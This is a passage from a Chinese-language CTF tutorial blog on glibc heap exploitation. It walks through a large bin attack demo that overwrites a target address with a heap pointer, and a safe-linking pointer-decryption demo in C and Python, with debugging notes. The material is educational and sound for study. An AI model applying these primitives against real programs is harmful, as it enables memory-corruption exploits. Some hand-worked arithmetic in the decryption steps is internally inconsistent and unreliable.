(%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>glibc-2.30</code> 新增了两道检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// largebin_chunk-&gt;bk_nextsize-&gt;fd_nextszie != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="comment">// largebin_chunk-&gt;bk-&gt;fd != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>利用代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-24"><a href="#调试-24" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015202953631.png"
                      alt="image-20231015202953631"
                ></p>
<p>布置堆结构如上，图中从上到下<code>chunk</code>分别为 <code>p1, g1, p2, g2</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203107725.png"
                      alt="image-20231015203107725"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203416086.png"
                      alt="image-20231015203416086"
                ></p>
<p>将 <code>chunk_p1</code> 放进 <code>largebin</code>，将 <code>chunk_p2</code> 放进 <code>unsorted_bin</code>，<code>(largebin)p1_size &gt; (unsorted)p2_size</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203720711.png"
                      alt="image-20231015203720711"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203842452.png"
                      alt="image-20231015203842452"
                ></p>
<p>修改<code>p1_bk_nextsize = target-0x20</code>，也就是<code>fake_chunk_fd_nextsize</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204330313.png"
                      alt="image-20231015204330313"
                ></p>
<p>然后申请 <code>0x438</code> 大小的 <code>chunk</code>，触发整理机制将 <code>chunk_p2</code> 链接进 <code>largebin</code>，因为 <code>p2_size &lt; (largebin_least)p1</code>，会触发如下代码。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// victim:p2, fwd:largebin表头, bck:largebin_least_chunk(p1)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk; </span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p><code>p2-&gt;fd_nextsize = p1; </code></p>
</li>
<li><p><code>p2-&gt;bk_nextsize = (target-0x20)p1-&gt;bk_nextsize;</code></p>
</li>
<li><p><code>(target-0x20)p1-&gt;bk_nextsize = p2;</code></p>
</li>
</ol>
<p> 第三步时将 <code>(target)fake_chunk_fd_nextsize</code> 改为了 <code>p2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204706099.png"
                      alt="image-20231015204706099"
                ></p>
<p>最后目标地址被成功修改为一个堆地址。</p>
<h2 id="decrypt-safe-linking-glibc-2-31"><a href="#decrypt-safe-linking-glibc-2-31" class="headerlink" title="decrypt_safe_linking(glibc &gt; 2.31)"></a>decrypt_safe_linking(glibc &gt; 2.31)</h2><p>本次使用 <code>ubuntu:22.04</code> 进行编译。</p>
<h3 id="源码-25"><a href="#源码-25" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">decrypt</span><span class="params">(<span class="type">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="type">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0.</span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to</span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="type">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="type">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="type">long</span> plaintext = <span class="built_in">decrypt</span>(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	<span class="built_in">assert</span>(plaintext == (<span class="type">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>对 <code>tcache_next(fd)</code> 新增检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 原理: A:fd;B:(pos&gt;&gt;12);C:(ptr); A=B^C; C=A^B;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png"
                      alt="eg"
                ></p>
<p><code>P</code> 表示将保存在空闲块的 <code>fd</code> 字段中的指针值。<code>L</code> 表示 <code>fd</code> 字段本身的地址。<code>L&gt;&gt;12</code>是 <code>L</code> 的右移值，用于对 <code>P</code> 进行异或运算，从而产生一个编码指针<code>P&#39;</code>。<code>Safe Linking</code> 将这个<code>P&#39;</code>值存储在 <code>fd</code> 字段中。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png"
                      alt="image-20231016094308974"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png"
                      alt="image-20231016094240180"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png"
                      alt="image-20231016094355521"
                ></p>
<p><code>bypass safe-linking</code>机制需要用到 <code>uaf</code>或者 <code>double free</code> 之类的漏洞, 同时释放 <code>tcache</code>到一个空闲 <code>tacahe bin</code>中, 此时由于<code>tcache bin</code> 中没有空闲<code>chunk</code>, <code>tcache-&gt;entry[tc_idx]=0</code>，若存在 <code>uaf</code> 或者 <code>double free</code>，可以泄露出 <code>leak_addr= (&amp;tcache_chunk-&gt;fd)&gt;&gt;12</code> 位置, 则 <code>heap_base=leak_addr&lt;&lt;12</code>。<code>double free</code> 需要将 <code>tcache_chunk_bk</code> 改为 <code>0</code>，绕过检查。对于 <code>2.32</code>及以后的 <code>glibc</code> 版本的 <code>tcache_poisoning</code> 需要将 <code>target</code> 地址进行加密。</p>
<h3 id="调试-25"><a href="#调试-25" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png"
                      alt="image-20231016095050228"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png"
                      alt="image-20231016095208868"
                ></p>
<p>申请<code>a,b</code>两个 <code>tcache_chunk</code>，最后一个 <code>chunk_0x10</code> 用于隔离，下面解析 <code>b_fd</code>。</p>
<ul>
<li>解密脚本:</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        bits= <span class="number">64</span>-<span class="number">12</span>*(i)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;round %d:\n&quot;</span>%(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>%key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>%plain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>%cipher)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>原理:</li>
</ul>
<p>前置:</p>
<p><code>P:0x0000_555_555_55b_2a0; L:0x0000_555_555_55b_2d0; L&gt;&gt;12:0x0000_000_555_555_55b; p&#39;:0x0000_555_000_00e_7fb</code></p>
<p><code>(0x55555555b2d0 &gt;&gt; 12) = 0x55555555B; 0x55555555b2a0 ^ 0x55555555B = 0x55500000E7FB;</code></p>
<p>步骤:</p>
<p><code>P ^ (L &gt;&gt; 12);</code>。 此时 <code>L</code> 高 <code>12</code> 位为 <code>0</code>，而 <code>P</code> 高 <code>12</code> 位为 <code>0x555</code>，异或时将保留 <code>0x0000_555</code>，而异或操作又是可逆的，所以用保留的 <code>0x0000_555_000_000_000</code> 和 低位 <code>0x0000_000_555_000_000</code> 取异或即可得到低三位的真实地址，以此类推有了以下步骤。</p>
<p>1. </p>
<p><code>bits = 52; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 52) &lt;&lt; 52 = 0x000_000_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0;</code></p>
<p>2. </p>
<p><code>bits = 40; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 40) &lt;&lt; 40 = 0x000_055_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_000_000_0</code> </p>
<p>3. </p>
<p><code>bits = 28; </code></p>
<p><code>key = 0x000_000_055_000_000_0; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_000_000_0) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_000_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_0000;</code></p>
<p>4. </p>
<p><code>bits = 16; </code></p>
<p><code>key = 0x000_000_055_555_0000; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_0000) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_5550;</code></p>
<p>5. </p>
<p><code>bits = 4; </code></p>
<p><code>key = 0x000_000_055_555_5550; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_5550) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_b2a0  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_055_555_555_b;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
</search>
